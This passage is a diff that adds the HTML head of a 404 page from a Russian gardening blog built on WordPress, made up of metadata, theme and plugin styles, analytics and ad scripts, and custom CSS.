@@ -1,0 +1,997 @@
+<!DOCTYPE html>
+<html lang="ru-RU">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <meta name='robots' content='noindex, follow' />
+
+	<title>Страница не найдена - GreenHome</title>
+	<meta property="og:locale" content="ru_RU" />
+	<meta property="og:title" content="Страница не найдена - GreenHome" />
+	<meta property="og:site_name" content="GreenHome" />
+	<script type="application/ld+json" class="yoast-schema-graph">{"@context":"https://schema.org","@graph":[{"@type":"WebSite","@id":"https://greenhome.blog/#website","url":"https://greenhome.blog/","name":"GreenHome","description":"Портал для любителей сада и огорода","potentialAction":[{"@type":"SearchAction","target":{"@type":"EntryPoint","urlTemplate":"https://greenhome.blog/?s={search_term_string}"},"query-input":"required name=search_term_string"}],"inLanguage":"ru-RU"}]}</script>
+
+
+<link rel='stylesheet' id='classic-theme-styles-css' href='https://greenhome.blog/wp-includes/css/classic-themes.min.css'  media='all' />
+<style id='global-styles-inline-css' type='text/css'>
+body{--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--duotone--dark-grayscale: url('#wp-duotone-dark-grayscale');--wp--preset--duotone--grayscale: url('#wp-duotone-grayscale');--wp--preset--duotone--purple-yellow: url('#wp-duotone-purple-yellow');--wp--preset--duotone--blue-red: url('#wp-duotone-blue-red');--wp--preset--duotone--midnight: url('#wp-duotone-midnight');--wp--preset--duotone--magenta-yellow: url('#wp-duotone-magenta-yellow');--wp--preset--duotone--purple-green: url('#wp-duotone-purple-green');--wp--preset--duotone--blue-orange: url('#wp-duotone-blue-orange');--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}body .is-layout-flow > .alignleft{float: left;margin-inline-start: 0;margin-inline-end: 2em;}body .is-layout-flow > .alignright{float: right;margin-inline-start: 2em;margin-inline-end: 0;}body .is-layout-flow > .aligncenter{margin-left: auto !important;margin-right: auto !important;}body .is-layout-constrained > .alignleft{float: left;margin-inline-start: 0;margin-inline-end: 2em;}body .is-layout-constrained > .alignright{float: right;margin-inline-start: 2em;margin-inline-end: 0;}body .is-layout-constrained > .aligncenter{margin-left: auto !important;margin-right: auto !important;}body .is-layout-constrained > :where(:not(.alignleft):not(.alignright):not(.alignfull)){max-width: var(--wp--style--global--content-size);margin-left: auto !important;margin-right: auto !important;}body .is-layout-constrained > .alignwide{max-width: var(--wp--style--global--wide-size);}body .is-layout-flex{display: flex;}body .is-layout-flex{flex-wrap: wrap;align-items: center;}body .is-layout-flex > *{margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
+.wp-block-navigation a:where(:not(.wp-element-button)){color: inherit;}
+:where(.wp-block-columns.is-layout-flex){gap: 2em;}
+.wp-block-pullquote{font-size: 1.5em;line-height: 1.6;}
+</style>
+<link rel='stylesheet' id='google-fonts-css' href='https://fonts.googleapis.com/css?family=Roboto%3A400%2C400i%2C700&#038;subset=cyrillic&#038;display=swap'  media='all' />
+<link rel='stylesheet' id='root-style-css' href='https://greenhome.blog/wp-content/themes/root/assets/css/style.min.css'  media='all' />
+<link rel='stylesheet' id='crb-template-css' href='https://greenhome.blog/wp-content/plugins/cherrylink/css/crb-template-simple.css'  media='all' />
+<link rel='stylesheet' id='root-style-child-css' href='https://greenhome.blog/wp-content/themes/root_child/style.css'  media='all' />
+<link rel='stylesheet' id='crb-template-override-css' href='https://greenhome.blog/wp-content/plugins/cherrylink/css/crb-template-admin-options.css'  media='all' />
+<style id='crb-template-override-inline-css' type='text/css'>
+
+                .crb-container {
+                    display: grid !important;
+                    grid-template-columns: 1fr 1fr 1fr !important;
+                    grid-column-gap: 20px !important; 
+                }
+                @media screen and (max-width: 40em) {
+                .crb-container {
+                    grid-template-columns: 1fr 1fr !important;
+                    grid-column-gap: 10px !important; 
+                }
+            }
+</style>
+<script  src='https://greenhome.blog/wp-includes/js/jquery/jquery.min.js' id='jquery-core-js'></script>
+<script  src='https://greenhome.blog/wp-includes/js/jquery/jquery-migrate.min.js' id='jquery-migrate-js'></script>
+<style>.pseudo-clearfy-link { color: #008acf; cursor: pointer;}.pseudo-clearfy-link:hover { text-decoration: none;}</style><link rel="icon" href="/wp-content/uploads/2021/06/favicon1.ico" type="image/x-icon">
+<link rel="icon" href="/wp-content/uploads/2021/06/favicon1.png" type="image/png">
+<link rel="icon" href="/wp-content/uploads/2021/06/favicon1.svg" type="image/svg+xml">
+
+<link rel="apple-touch-icon" sizes="120x120" href="/wp-content/uploads/2021/06/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/wp-content/uploads/2021/06/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/wp-content/uploads/2021/06/favicon-16x16.png">
+<link rel="mask-icon" href="/wp-content/uploads/2021/06/safari-pinned-tab.svg" color="#24AF60">
+<meta name="msapplication-TileColor" content="#24AF60">
+<meta name="theme-color" content="#24AF60">
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-PRZF850DTK"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-PRZF850DTK');
+</script>
+
+<!-- Yandex.RTB -->
+<script>window.yaContextCb=window.yaContextCb||[]</script>
+<script src="https://yandex.ru/ads/system/context.js" async></script>
+
+
+
+<style>.site-logotype {max-width:1000px}.site-logotype img {max-height:100px}@media (max-width: 991px) {.mob-search{display:block;margin-bottom:25px} }.scrolltop {background-color:#cccccc}.scrolltop:after {color:#ffffff}.scrolltop {width:50px}.scrolltop {height:50px}.scrolltop:after {content:"\f102"}.entry-image:not(.entry-image--big) {margin-left:-20px}@media (min-width: 1200px) {.entry-image:not(.entry-image--big) {margin-left:-40px} }body {font-family:"Roboto" ,"Helvetica Neue", Helvetica, Arial, sans-serif}@media (min-width: 576px) {body {font-size:16px} }@media (min-width: 576px) {body {line-height:1.5} }.site-title, .site-title a {font-family:"Roboto" ,"Helvetica Neue", Helvetica, Arial, sans-serif}@media (min-width: 576px) {.site-title, .site-title a {font-size:28px} }@media (min-width: 576px) {.site-title, .site-title a {line-height:1.1} }.site-description {font-family:"Roboto" ,"Helvetica Neue", Helvetica, Arial, sans-serif}@media (min-width: 576px) {.site-description {font-size:16px} }@media (min-width: 576px) {.site-description {line-height:1.5} }.main-navigation ul li a, .main-navigation ul li .removed-link, .footer-navigation ul li a, .footer-navigation ul li .removed-link{font-family:"Roboto" ,"Helvetica Neue", Helvetica, Arial, sans-serif}@media (min-width: 576px) {.main-navigation ul li a, .main-navigation ul li .removed-link, .footer-navigation ul li a, .footer-navigation ul li .removed-link {font-size: 16px} }@media (min-width: 576px) {.main-navigation ul li a, .main-navigation ul li .removed-link, .footer-navigation ul li a, .footer-navigation ul li .removed-link {line-height:1.5} }.h1, h1:not(.site-title) {font-weight:bold;}.h2, h2 {font-weight:bold;}.h3, h3 {font-weight:bold;}.h4, h4 {font-weight:bold;}.h5, h5 {font-weight:bold;}.h6, h6 {font-weight:bold;}.mob-hamburger span, .card-slider__category, .card-slider-container .swiper-pagination-bullet-active, .page-separator, .pagination .current, .pagination a.page-numbers:hover, .entry-content ul > li:before, .entry-content ul:not([class])>li:before, .taxonomy-description ul:not([class])>li:before, .btn, .comment-respond .form-submit input, .contact-form .contact_submit, .page-links__item {background-color:#27ae60}.spoiler-box, .entry-content ol li:before, .entry-content ol:not([class]) li:before, .taxonomy-description ol:not([class]) li:before, .mob-hamburger, .inp:focus, .search-form__text:focus, .entry-content blockquote,
+         .comment-respond .comment-form-author input:focus, .comment-respond .comment-form-author textarea:focus, .comment-respond .comment-form-comment input:focus, .comment-respond .comment-form-comment textarea:focus, .comment-respond .comment-form-email input:focus, .comment-respond .comment-form-email textarea:focus, .comment-respond .comment-form-url input:focus, .comment-respond .comment-form-url textarea:focus {border-color:#27ae60}.entry-content blockquote:before, .spoiler-box__title:after, .sidebar-navigation .menu-item-has-children:after,
+        .star-rating--score-1:not(.hover) .star-rating-item:nth-child(1),
+        .star-rating--score-2:not(.hover) .star-rating-item:nth-child(1), .star-rating--score-2:not(.hover) .star-rating-item:nth-child(2),
+        .star-rating--score-3:not(.hover) .star-rating-item:nth-child(1), .star-rating--score-3:not(.hover) .star-rating-item:nth-child(2), .star-rating--score-3:not(.hover) .star-rating-item:nth-child(3),
+        .star-rating--score-4:not(.hover) .star-rating-item:nth-child(1), .star-rating--score-4:not(.hover) .star-rating-item:nth-child(2), .star-rating--score-4:not(.hover) .star-rating-item:nth-child(3), .star-rating--score-4:not(.hover) .star-rating-item:nth-child(4),
+        .star-rating--score-5:not(.hover) .star-rating-item:nth-child(1), .star-rating--score-5:not(.hover) .star-rating-item:nth-child(2), .star-rating--score-5:not(.hover) .star-rating-item:nth-child(3), .star-rating--score-5:not(.hover) .star-rating-item:nth-child(4), .star-rating--score-5:not(.hover) .star-rating-item:nth-child(5), .star-rating-item.hover {color:#27ae60}body {color:#333333}a, .spanlink, .comment-reply-link, .pseudo-link, .root-pseudo-link {color:#428bca}a:hover, a:focus, a:active, .spanlink:hover, .comment-reply-link:hover, .pseudo-link:hover {color:#e66212}.site-header {background-color:#ffffff}.site-header {color:#333333}.site-title, .site-title a {color:#5a80b1}.site-description, .site-description a {color:#666666}.main-navigation, .footer-navigation, .main-navigation ul li .sub-menu, .footer-navigation ul li .sub-menu {background-color:#27ae60}.main-navigation ul li a, .main-navigation ul li .removed-link, .footer-navigation ul li a, .footer-navigation ul li .removed-link {color:#ffffff}.site-content {background-color:#ffffff}.site-footer {background-color:#ffffff}.site-footer {color:#333333}</style><link rel="preload" href="https://greenhome.blog/wp-content/themes/root/fonts/fontawesome-webfont.ttf" as="font" crossorigin><noscript><style>.lazyload[data-src]{display:none !important;}</style></noscript><style>.lazyload{background-image:none !important;}.lazyload:before{background-image:none !important;}</style><style>.wp-block-gallery.is-cropped .blocks-gallery-item picture{height:100%;width:100%;}</style>		<style type="text/css" id="wp-custom-css">
+			.tg-invite {
+    display: flex;
+    padding: 40px 10px 10px;
+    background: #fff;
+    box-shadow: 0px 15px 15px 0 #00000061;
+    border-radius: 5px;
+    width: 340px;
+}
+
+.tg-invite-img img {
+    margin: 0;
+}
+
+.tg-invite-text {
+    margin-left: 15px;
+}
+
+.tg-invite-title a{
+    font-weight: 700;
+	  color: #333;
+}
+
+.tg-invite-btn a {
+    border-bottom: 1px solid #428bca;
+}
+
+.tg-invite-btn a:hover {
+    border-bottom: 1px solid #e66212;
+}
+
+@media (min-width: 1200px)
+{.entry-image {
+    margin-left: 0;
+}
+}
+
+.entry-image {
+    position: relative;
+    margin: 0 0 15px 0px;
+}
+
+.entry-footer__more {
+    margin-top: 10px;
+    display: inline-block;
+    background: #E74C3C;
+    padding: 10px 20px;
+    color: #fff;
+    transition: all ease-in 0.2s;
+    box-shadow: rgba(35, 40, 45, 0.20) 0 5px 10px 2px;
+}
+
+.entry-footer__more:hover {
+    display: inline-block;
+    background: #C0392B;
+    padding: 10px 20px;
+    color: #fff;
+    transition: all ease-in 0.2s;
+    box-shadow: none;
+}
+
+.contact-form input {
+    width: 100%;
+    margin-bottom: 10px;
+}
+
+.contact_name {margin-bottom:0px;}
+.contact_email {margin-top: -23px;}
+.contact_theme {margin-bottom: -23px;}
+
+.contact_submit {
+    background: #E74C3C;
+    border: none;
+    color: #fff;
+    padding: 10px 25px;
+    transition: all ease-in 0.2s;
+    box-shadow: rgba(35, 40, 45, 0.20) 0 5px 10px 2px;
+}
+
+.contact_submit:hover {
+    background: #C0392B;
+    border: none;
+    color: #fff;
+    padding: 10px 25px;
+    transition: all ease-in 0.2s;
+    box-shadow: none;
+    cursor: pointer;
+}
+
+.aligncenter {
+    display: block;
+    margin: 25px auto;
+}
+
+
+.calendar {
+  display: -webkit-box;
+  display: -ms-flexbox;
+  display: flex;
+  -webkit-box-pack: justify;
+  -ms-flex-pack: justify;
+  justify-content: space-between;
+  -webkit-box-align: center;
+  -ms-flex-align: center;
+  align-items: center;
+  width: 100%;
+	margin: 25px 0;
+  padding: 15px 25px;
+  text-align: center;
+  border-radius: 10px;
+  -webkit-box-shadow: rgba(185, 185, 185, 0.7) 0px 0px 15px 0;
+  box-shadow: rgba(185, 185, 185, 0.7) 0px 0px 15px 0;
+  background-image: linear-gradient(135deg, #fff1eb 0%, #ace0f9 100%);
+  -webkit-box-sizing: border-box;
+  box-sizing: border-box;
+		font-size: 14px;
+}
+
+.calendar-item {
+  margin: 10px 0
+}
+
+.calendar-item__date-info,
+.calendar-item__sign-ms {
+  font-weight: bold;
+  margin-bottom: 5px
+}
+
+.good-day {
+  background-image: linear-gradient(60deg, #abecd6 0%, #fbed96 100%)
+}
+
+.bad-day {
+  background-image: linear-gradient(-20deg, #ddd6f3 0%, #faaca8 100%, #faaca8 100%)
+}
+
+.calendar-item__moon-day-d {
+  font-weight: bold;
+  margin-bottom: 5px
+}
+
+.calendar-item__time-up,
+.calendar-item__time-down {
+  position: relative;
+  padding-left: 30px;
+  font-weight: bold
+}
+
+.calendar-item__time-up::before,
+.calendar-item__time-down::before {
+  position: absolute;
+  content: "🔼";
+  top: -3px;
+  left: 0;
+  width: 16px;
+  height: 16px;
+  font-size: 16px
+}
+
+.calendar-item__time-up {
+  margin-bottom: 5px
+}
+
+.calendar-item__time-down::before {
+  content: "🔽"
+}
+
+.calendar-item__rating span {
+  font-size: 30px;
+  font-weight: bold;
+  padding: 0 2px
+}
+
+.calendar-item__rating span.p {
+  color: green
+}
+
+.calendar-item__rating span.pm {
+  color: grey
+}
+
+.calendar-item__rating span.m {
+  color: red
+}
+
+.calendar-item__link-more::after {
+  position: absolute;
+  content: "👉";
+  top: -5px;
+  right: 0;
+  width: 16px;
+  height: 15px
+}
+
+@media (max-width: 960px) {
+  .calendar {
+    -ms-flex-wrap: wrap;
+    flex-wrap: wrap;
+		font-size: 13px;
+			
+  }
+
+  .calendar-item__rating span {
+    font-size: 25px;
+    font-weight: bold;
+    padding: 0 2px
+  }
+}
+
+.cdlist {
+  display: flex;
+  flex-wrap: wrap;
+  padding: 20px;
+  margin: 25px 0;
+  list-style:  none;
+  border-radius: 10px;
+  -webkit-box-shadow: rgba(185, 185, 185, 0.7) 0px 0px 15px 0;
+  box-shadow: rgba(185, 185, 185, 0.7) 0px 0px 15px 0;
+  background-image: linear-gradient(135deg, #fff1eb 0%, #ace0f9 100%);
+  -webkit-box-sizing: border-box;
+  box-sizing: border-box;
+}
+
+.cditem {
+  width: 32%;
+  padding: 5px;
+}
+
+a.cdlink.gd-link {
+  color: green;
+}
+
+a.cdlink.bd-link {
+  color: red;
+}
+
+@media (max-width: 960px) {
+	.cdlink {
+  font-size: 14px;
+}
+}
+
+.table-of-contents ol {
+	  font-size: 15px;
+    column-count: 2;
+    column-width: 245px;
+    column-gap: 2em;
+}
+
+/* Перелинковка */
+
+.linker {
+      margin: 30px 0;
+      padding: 20px 20px 5px;
+      background-color: #f0fcf3;
+      border-radius: 10px;
+    }
+
+.linker .link-hint {
+	margin: 0 0 15px;
+}
+
+.linker .link-content p {
+	margin: 0; 
+}
+
+    .link-main {
+			position: absolute;
+      width: 100%;
+      height: 100%;
+      top: 0;
+      left: 0;
+      z-index: 1;
+      text-decoration: none;
+      color: #333;
+    }
+
+    .linker-wrapper {
+			position: relative;
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: space-between;
+    }
+
+    .link-img-wrapper {
+      width: 35%;
+    }
+
+    .link-img {
+      width: 100%;
+      height: auto;
+    }
+
+    .link-content {
+      display: flex;
+      flex-direction: column;
+      width: 60%;
+    }
+
+    .linker .link-title {
+      font-size: 20px;
+      font-weight: bold;
+      margin: 0;
+      color: #E74C3C;
+    }
+
+   .linker p.link-text {
+      margin-top: 15px;
+      text-decoration: none;
+      color: #333;
+    }
+
+    .link-btn {
+      cursor: pointer;
+      align-self: start;
+      text-decoration: none;
+			margin: 20px 0 0 0;
+      padding: 10px 20px;
+      color: #fff;
+      background-color: #E74C3C;
+      border: 1px solid #E74C3C;
+      border-radius: 5px;
+      transition: color ease .3s, background-color ease .3s;
+    }
+
+    .link-btn:hover,
+    .link-btn:focus {
+      color: #fff;
+      background-color: #ce3423;
+    }
+
+    @media (max-width: 450px) {
+      .linker {
+        margin: 30px 0;
+        padding: 20px 20px 0px;
+        border-radius: 0;
+      }
+
+      .linker-wrapper {
+        flex-direction: column;
+      }
+
+      .link-img-wrapper {
+        width: 100%;
+      }
+
+      .link-img {
+        width: 100%;
+        height: 175px;
+        object-fit: cover;
+      }
+
+      .link-content {
+        width: 100%;
+        margin-top: 35px;
+      }
+
+    .linker .link-title {
+        font-size: 16px;
+      }
+
+   .linker p.link-text {
+        margin-top: 15px;
+      }
+
+     .linker .link-btn {
+			  margin: 20px 0 0 0;
+        padding: 8px 16px;
+      }
+    }
+
+.taxonomy-description {
+    margin-bottom: 25px;
+    font-size: .95em;
+    line-height: 1.4;
+    background: #0000;
+    padding: 0;
+    color: #333;
+}		</style>
+		<style>.clearfy-cookie { position:fixed; left:0; right:0; bottom:0; padding:12px; color:#555555; background:#ffffff; -webkit-box-shadow:0 0 15px rgba(0,0,0,.2); -moz-box-shadow:0 0 15px rgba(0,0,0,.2); box-shadow:0 0 15px rgba(0,0,0,.2); z-index:9999; font-size: 13px; transition: .3s; }.clearfy-cookie--left { left: 20px; bottom: 20px; right: auto; max-width: 400px; margin-right: 20px; }.clearfy-cookie--right { left: auto; bottom: 20px; right: 20px; max-width: 400px; margin-left: 20px; }.clearfy-cookie.clearfy-cookie-hide { transform: translateY(150%) translateZ(0); opacity: 0; }.clearfy-cookie-container { max-width:1170px; margin:0 auto; text-align:center; }.clearfy-cookie-accept { background:#4b81e8; color:#fff; border:0; padding:.4em .8em; margin: 0 .5em; font-size: 13px; cursor: pointer; }.clearfy-cookie-accept:hover,.clearfy-cookie-accept:focus { opacity: .9; }</style><!--noptimize--><script data-noptimize="" data-wpfc-render="false">
+window.fpm_settings = {"timer_text":"\u0417\u0430\u043a\u0440\u044b\u0442\u044c \u0447\u0435\u0440\u0435\u0437","lazyload":"false","threshold":"300","dublicate":"false","rtb":"false","sidebar":"false","selector":".fpm_end","bottom":"10","ajaxUrl":"https:\/\/greenhome.blog\/wp-admin\/admin-ajax.php","speed":"300"};
+</script>
+<!--/noptimize--><!--noptimize-->
+<noscript data-noptimize id="fpm_modul">
+<style>
+html{max-width:100vw}
+.fpm-async:not([data-fpm-type="outgoing"]) + .fpm-async:not([data-fpm-type="outgoing"]){display:none}
+[data-fpm-type]{background-color:transparent;transition:background-color .2s ease}
+[data-fpm-type]{position:relative;overflow:hidden;border-radius:3px;z-index:0}
+.fpm-cross{transition:box-shadow .2s ease;position:absolute;top:-0px;right:0;width:34px;height:34px;background:#000000;display:block;cursor:pointer;z-index:99;border:none;padding:0;min-width:0;min-height:0}
+.fpm-cross:hover{box-shadow:0 0 0 50px rgba(0,0,0,.2) inset}
+.fpm-cross:after,
+.fpm-cross:before{transition:transform .3s ease;content:'';display:block;position:absolute;top:0;left:0;right:0;bottom:0;width:calc(34px / 2);height:3px;background:#ffffff;transform-origin:center;transform:rotate(45deg);margin:auto}
+.fpm-cross:before{transform:rotate(-45deg)}
+.fpm-cross:hover:after{transform:rotate(225deg)}
+.fpm-cross:hover:before{transform:rotate(135deg)}
+.fpm-timer{position:absolute;top:-0px;right:0;padding:0 15px;color:#ffffff;background:#000000;line-height:34px;height:34px;text-align:center;font-size:14px;z-index:99}
+[data-fpm-type="outgoing"].center .fpm-timer,[data-fpm-type="outgoing"].center .fpm-cross{top:0!important}
+.fpm-timer span{font-size:16px;font-weight:600}
+[data-fpm-type="outgoing"]{transition:transform 300ms ease,opacity 300ms ease,min-width 0s;transition-delay:0s,0s,.3s;position:fixed;min-width:250px!important;z-index:9999;opacity:0;background:#ffffff;pointer-events:none;will-change:transform;overflow:visible;max-width:100vw}
+
+
+[data-fpm-type="outgoing"] *{max-width:none}
+
+[data-fpm-type="outgoing"].left-top [id*="yandex_rtb_"],
+[data-fpm-type="outgoing"].right-top [id*="yandex_rtb_"],
+[data-fpm-type="outgoing"].left-center [id*="yandex_rtb_"],
+[data-fpm-type="outgoing"].right-center [id*="yandex_rtb_"],
+[data-fpm-type="outgoing"].left-bottom [id*="yandex_rtb_"],
+[data-fpm-type="outgoing"].right-bottom [id*="yandex_rtb_"]{max-width:336px;min-width:160px}
+
+[data-fpm-type].no-preloader:after,[data-fpm-type].no-preloader:before,
+[data-fpm-type="outgoing"]:after,[data-fpm-type="outgoing"]:before{display:none}
+
+[data-fpm-type="outgoing"].fpm-show{opacity:1;pointer-events:all;min-width:0!important}
+
+[data-fpm-type="outgoing"].center{position:fixed;top:50%;left:50%;height:auto;z-index:-2;opacity:0;transform:translateX(-50%) translateY(-50%) scale(.6)}
+[data-fpm-type="outgoing"].center.fpm-show{transform:translateX(-50%) translateY(-50%) scale(1);opacity:1}
+[data-fpm-type="outgoing"].center.fpm-show{z-index:2000}
+
+[data-fpm-type="outgoing"].left-top{top:0;left:0;transform:translateX(-100%)}
+[data-fpm-type="outgoing"].top-center{top:0;left:50%;transform:translateX(-50%) translateY(-100%)}
+[data-fpm-type="outgoing"].right-top{top:0;right:0;transform:translateX(100%)}
+[data-fpm-type="outgoing"].left-center{top:50%;left:0;transform:translateX(-100%) translateY(-50%)}
+[data-fpm-type="outgoing"].right-center{top:50%;right:0;transform:translateX(100%) translateY(-50%)}
+[data-fpm-type="outgoing"].left-bottom{bottom:0;left:0;transform:translateX(-100%)}
+[data-fpm-type="outgoing"].bottom-center{bottom:0;left:50%;transform:translateX(-50%) translateY(100%)}
+[data-fpm-type="outgoing"].right-bottom{bottom:0;right:0;transform:translateX(100%)}
+[data-fpm-type="outgoing"].fpm-show.left-center,
+[data-fpm-type="outgoing"].fpm-show.right-center{transform:translateX(0) translateY(-50%)}
+[data-fpm-type="outgoing"].fpm-show.top-center,
+[data-fpm-type="outgoing"].fpm-show.bottom-center{transform:translateX(-50%) translateY(0)}
+[data-fpm-type="outgoing"].fpm-show.left-top,
+[data-fpm-type="outgoing"].fpm-show.right-top,
+[data-fpm-type="outgoing"].fpm-show.left-bottom,
